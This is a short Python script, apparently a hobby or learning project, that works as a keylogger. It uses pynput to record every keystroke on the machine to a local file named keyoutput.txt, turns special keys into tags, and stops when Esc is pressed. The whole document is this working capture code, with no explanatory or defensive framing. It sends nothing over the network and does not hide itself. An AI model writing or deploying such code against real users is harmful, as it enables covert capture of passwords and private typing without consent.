#!/usr/bin/python3
from pynput.keyboard import Key, Listener
import time

file = "keyoutput.txt"
x = time.ctime()
with open(file, "w") as f:
    f.write("[" + x + "]: " )
    
count = 0
keys = []
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 2:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file, "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k == "Key.enter":
                f.write('\n')
            elif k == "Key.space":
                f.write(' ')            
            elif k == "Key.caps_lock":
                f.write('<capslock>')            
            elif k == "Key.backspace":
                f.write('<backspace>')            
            elif k == "Key.tab":
                f.write('<tab>')            
            elif k == "Key.shift_r":
                f.write('<Rshift>')            
            elif k == "Key.shift":
                f.write('<Lshift>') 
            elif k == "Key.ctrl_r":
                f.write('<Rctrl>')            
            elif k == "Key.ctrl_l":
                f.write('<Lctrl>')      
            elif k == "Key.esc":
                f.write('<esc>')
            else:
                f.write(k)
    
def on_release(key):
    if key == Key.esc:
        return False
 
with Listener(on_press=on_press, on_release=on_release) as listener :
    listener.join()

